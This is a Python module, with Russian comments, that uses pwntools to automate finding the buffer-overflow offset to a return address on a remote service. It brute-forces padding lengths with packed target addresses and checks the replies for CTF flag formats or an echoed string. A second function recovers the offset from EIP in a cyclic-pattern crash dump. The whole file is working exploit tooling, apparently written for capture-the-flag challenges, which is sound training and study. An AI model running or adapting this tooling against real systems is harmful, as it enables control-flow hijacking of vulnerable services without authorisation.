"""
Модуль для автоматического определения OFFSET через "эхо-оракул".
Используется когда точный отступ до адреса возврата неизвестен.
"""
from pwn import *
import time

def find_offset_with_echo(host, port, target_addrs, echo_string="Give me a string!", 
                          min_offset=100, max_offset=500, step=4, timeout=2):
    """
    Находит точный OFFSET через эхо-оракул.
    
    Args:
        host: адрес сервера
        port: порт сервера
        target_addrs: список кортежей (адрес, имя_функции), например [(0x40151c, "win"), (0x401595, "vuln")]
        echo_string: строка, которая должна повториться при успешном переходе
        min_offset: минимальный OFFSET для проверки
        max_offset: максимальный OFFSET для проверки
        step: шаг проверки (обычно 4 для 32-бит, 8 для 64-бит)
        timeout: таймаут соединения в секундах
    
    Returns:
        (offset, addr, name) если найден, иначе None
    """
    print(f"[*] Начинаем поиск OFFSET через эхо-оракул ({min_offset}-{max_offset})...")
    print(f"[*] Эхо-строка: \"{echo_string}\"")
    
    for offset in range(min_offset, max_offset + 1, step):
        for addr, name in target_addrs:
            try:
                io = remote(host, port, timeout=timeout)
                time.sleep(0.3)
                
                # Определяем архитектуру для упаковки адреса
                if context.arch == 'i386':
                    addr_bytes = p32(addr)
                else:
                    addr_bytes = p64(addr)
                
                payload = b'A' * offset + addr_bytes
                io.sendline(payload)
                
                out = io.recvall(timeout=timeout).decode('utf-8', errors='ignore')
                
                # Проверяем наличие флага (прямой успех)
                if "academy{" in out or "picoCTF{" in out or "flag{" in out:
                    print(f"\n ПОЛНЫЙ УСПЕХ! OFFSET = {offset}, ЦЕЛЬ = {name} ({hex(addr)})")
                    io.close()
                    return offset, addr, name
                
                # Проверяем "эхо-оракул": строка встретилась 2+ раз
                if out.count(echo_string) >= 2:
                    print(f"\n[+] НАЙДЕН ВЕРНЫЙ OFFSET! OFFSET = {offset}, ЦЕЛЬ = {name} ({hex(addr)})")
                    print(f"[*] Программа не упала, а продолжила работу (сработал оракул)!")
                    io.close()
                    return offset, addr, name
                    
            except Exception:
                pass
            finally:
                try:
                    io.close()
                except:
                    pass
    
    print(f"[-] OFFSET не найден в диапазоне {min_offset}-{max_offset}")
    return None

def find_offset_with_cyclic(host, port, payload_length=200, echo_string="Give me a string!"):
    """
    Находит OFFSET через cyclic pattern и анализ краш-дампа.
    Работает только если сервер возвращает дамп сбоя (редко для CTF).
    """
    print(f"[*] Отправляем cyclic pattern ({payload_length} байт)...")
    
    io = remote(host, port, timeout=3)
    time.sleep(0.3)
    
    pattern = cyclic(payload_length)
    io.sendline(pattern)
    
    out = io.recvall(timeout=3).decode('utf-8', errors='ignore')
    io.close()
    
    # Ищем EIP в дампе
    import re
    eip_match = re.search(r'EIP:([0-9a-fA-F]+)', out)
    if eip_match:
        eip_hex = eip_match.group(1)
        eip_val = int(eip_hex, 16)
        eip_bytes = p32(eip_val) if context.arch == 'i386' else p64(eip_val)
        offset = cyclic_find(eip_bytes)
        print(f"[+] Найден OFFSET через cyclic: {offset}")
        return offset
    
    print(f"[-] Не удалось найти EIP в дампе")
    return None
